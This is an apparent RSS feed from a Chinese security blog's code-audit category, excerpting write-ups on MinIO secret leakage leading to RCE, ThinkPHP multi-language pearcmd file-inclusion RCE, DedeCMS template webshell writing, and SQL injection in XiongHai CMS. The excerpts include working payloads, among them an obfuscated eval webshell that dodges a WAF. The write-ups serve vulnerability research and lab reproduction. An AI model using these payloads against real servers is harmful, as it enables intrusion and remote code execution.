<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>代码审计 - Category - ThnPinkman’s blog</title>
        <link>https://thnpkm.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
        <description>代码审计 - Category - ThnPinkman’s blog</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 22:54:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="self" type="application/rss+xml" /><item>
    <title>MinIO从信息泄漏到RCE</title>
    <link>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0rce/</link>
    <pubDate>Tue, 20 Aug 2024 22:54:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0rce/</guid>
    <description><![CDATA[MinIO从信息泄漏到RCE 信息泄露 漏洞利用 如果MinIO以集群方式部署，存在信息泄露漏洞，攻击者可以通过HTTP请求获取目标进程的所有环境变量，包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD.
vulhub有环境可以复现
payload：
POST: /minio/bootstrap/v1/verify 拿到预存的用户名和密码可以直接登录了
漏洞分析 根据main.go中的加载模块得知代码逻辑在minio/cmd中
package main // import &#34;github.com/minio/minio&#34;import (&#34;os&#34;// MUST be first import._ &#34;github.com/minio/minio/internal/init&#34;minio &#34;github.com/minio/minio/cmd&#34;)func main() {minio.Main(os.Args)} 漏洞代码在minio/cmd/bootstrap-peer-server.go
接受HTTP请求的方法只有两个
line133,代码新建上下文对象，用于传递HTTP请求和响应。 line135,用于输出错误日志。 line134作为则是获取服务器系统配置。
跟进line134的getServerSystemCfg()
在getServerSystemCfg()方法中获取所有以MINIO_开头的环境变量
将环境变量存储在envValues里面，其中envValues采用遍历的方式获取了skipEnvs[envK]的value
然后，函数返回一个名为ServerSystemConfig的结构体，其中包含了全局变量和环境变量。
跟进skipEnvs
包含一些敏感信息，有预先设置的密码MINIO_CERT_PASSWD
bootstrap-peer-server.go也定义了Verify的路由
cmd/routers.go:75 判断了一下是集群才会注册上述路由
漏洞修复 环境变量进行了加密处理
https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077?diff=splitRCE 漏洞分析 当通过信息泄漏获得账号密码之后，可以登陆MinIO更新恶意升级URL，并且执行update触发RCE
验证管理员权限→获取最新版本→获取最新版本的sha256sum信息→下载并验证sha256sum→验证无误后替换自身并重启。
cmd/admin-handlers.go ，ServerUpdateHandler函数
在/minio/admin/v3/update?updateURL={updateURL}这个路由的功能中，可以从远程加载二进制文件，下载并更新。
func (a adminAPIHandlers) ServerUpdateHandler(w http.ResponseWriter, r *http.Request) {// 验证是否是admin权限objectAPI, _ := validateAdminReq(ctx, w, r, iampolicy.]]></description>
</item>
<item>
    <title>Thinkphp 多语言 RCE</title>
    <link>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-rce/</link>
    <pubDate>Tue, 20 Aug 2024 22:54:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80-rce/</guid>
    <description><![CDATA[Thinkphp 多语言 RCE 漏洞介绍 Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x
如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。
文件包含漏洞存在的情况下还需要服务器满足下面两个条件才能利用：
PHP环境开启了register_argc_argv PHP环境安装了pcel/pear Docker默认的PHP环境恰好满足上述条件。所以先使用vulhub进行漏洞利用的复现
vulhub漏洞搭建 cd vulhub/thinkphp/lang-rce编译环境docker-compose build运行环境docker-compose up -d 访问 ip:8080
漏洞利用 测试包含public/index.php文件来确认文件包含漏洞是否存在
?lang=../../../../../public/index 如果漏洞存在，则服务器会出错，返回500页面
利用一：写入文件 利用pearcmd写入shell文件
?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php 如果服务器返回pearcmd的命令行执行结果，说明漏洞利用成功
此时访问url/shell.php即可发现已经成功写入文件
利用二：文件包含 使用pearcmd在/tmp文件夹下创建文件再进行包含，P神文章?lang=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?=phpinfo()?&gt;+/tmp/shell.php ?lang=../../../../../../../tmp/shell 2023 realword ctf体验赛 中出现了这个利用方法
漏洞分析 TP6在路径app/middleware.php 开启多语言特性
测试漏洞成功
thinkphp程序初始化都会运行src/think/App.php里的initialize()方法
函数中使用this-&gt;loadLangPack()获取语言包，跟进loadLangPack()方法
却发现只有加载默认语言包的功能，换一条路
访问
?lang=../../../../../public/index src/think/middleware/LoadLangPack.php 查看LoadLangPack.php
在 middleware 的 handle() 函数会被调用，这里断在 LoadLangPack.php 的 handle()
跟进detect()方法
可以看到依次排查了 GET[&quot;lang&quot;] 、HEADER[&quot;think-lang&quot;] 、COOKIE[&quot;think_lang&quot;] ，并且将其不做任何过滤，直接赋值给了 $langSet]]></description>
</item>
<item>
    <title>代码审计-DedeCMS v5.7</title>
    <link>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/</link>
    <pubDate>Tue, 20 Aug 2024 22:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/</guid>
    <description><![CDATA[环境搭建 这里下的源码 http://m.dedemao.com/view/2417某些版本有坑，后台登录为空，没有成功解决
这个版本可以
后台RCE 漏洞影响版本： &lt;=DedeCMS v5.7.105
漏洞复现 登录后台 新建模板
&lt;?php &#34;\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73&#34;(&#39;./shell.php&#39;, &#34;&lt;?php eva&#34; . &#34;l&#34; . &#34;(&#34; . &#34;$&#34; . &#34;_GE&#34; . &#34;T[1]);&#34;); 其实就是 file_put_contents('./shell.php', &quot;&lt;?php eval($_GET[1]);&quot;); ，为了绕waf
把这个内容新建到1.htm 模板里
然后新建页面，模板就引用1.htm ，新建文件用php后缀，这里会把htm文件里的内容写入到新建的php文件里
成功后我们就得到了一个1.php文件，去访问一下，就可以执行代码 写入shell.php文件
http://localhost:884/a/1.php 这里注意php的版本啊，刚开始用的5.6会报错，7以上应该可以
至此我们任意文件写入 就达到了
漏洞分析 可以看到新建模板的href 是tpl.php
模板创建 并没有严格check内容 模板结尾必须是.htm，一些表单标签的关键字进行了替换
更前面的版本是没有过滤的，比如我这个，可以直接创建一个shell文件
&lt;=DedeCMS v5.7.105 会有过滤, 通过上面的绕过方法也能绕过了
/* (/\*)[\s\S]*(\*/)#i 是一个正则表达式模式，表示要匹配的内容。 其中，/\*和 \*/表示分别匹配开头的 &#34;/&#34; 和结尾的 &#34;/&#34; 符号，[\s\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。 这个正则表达式的作用是查找 $content 变量中所有以 &#34;/&#34; 开头、以 &#34;/&#34; 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。 */ $content = preg_replace(&#34;#(/\*)[\s\S]*(\*/)#i&#34;, &#39;&#39;, $content); // 黑名单正则匹配，禁了下面这些函数 global $cfg_disable_funs; $cfg_disable_funs = isset($cfg_disable_funs) ?]]></description>
</item>
<item>
    <title>代码审计-熊海cms_V1.0</title>
    <link>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/</link>
    <pubDate>Tue, 20 Aug 2024 22:52:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/</guid>
    <description><![CDATA[本地环境搭建 https://article.itxueyuan.com/2dqxD2不赘述了，很坑的一点是网上的文章说php7以下可以，但是我用php5.4一直不行，最后换了5.6可以了
漏洞发现 可以用seay来匹配一下危险函数
Rips扫描
这次也试试Kunlun-M白盒审计工具 https://github.com/LoRexxar/Kunlun-M代码审计 首先我在web目录里创建了一个phpinfo.php文件 来进行测试
index.php 文件包含 可以看到seay第一个扫出来的就是这个点
&lt;?php //单一入口模式 error_reporting(0); //关闭错误显示 $file=addslashes($_GET[&#39;r&#39;]); //接收文件名 $action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于index include(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件 ?&gt; get传参文件名到$action变量，然后include进行files文件夹下的文件包含，来进行网页跳转
变量是没有任何过滤的，明显文件名可以目录穿越
admin/index.php中同理
SQL注入 后台 看见扫描出来的sql注入还是挺多的，看看
admin/files/login.php
就是没有任何过滤，然后die了错误信息回显
报错注入可以
user=admin&#39; or updatexml(1,concat(0x7e,(select version()),0x7e),1);# 测试了一下时间盲注也可以
admin/files里的文件大都是有这种没丝毫过滤的sql注入，不赘述了
SQL注入 前台 files/content.php
这里面倒是做了一点处理，addslashes()进行转义
但是
默认情况下，PHP 指令 magic_quotes_gpc 为 on，对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。
这也有点小离谱哈哈哈
所以这里的转义可能是没有用的
/install/index.php里面
反射型XSS $page=addslashes($_GET[&#39;page&#39;]); if ($page&lt;&gt;&#34;&#34;){ if ($page&lt;&gt;1){ $pages=&#34;第&#34;.$page.&#34;页 - &#34;; } &lt;?]]></description>
</item>
</channel>
</rss>
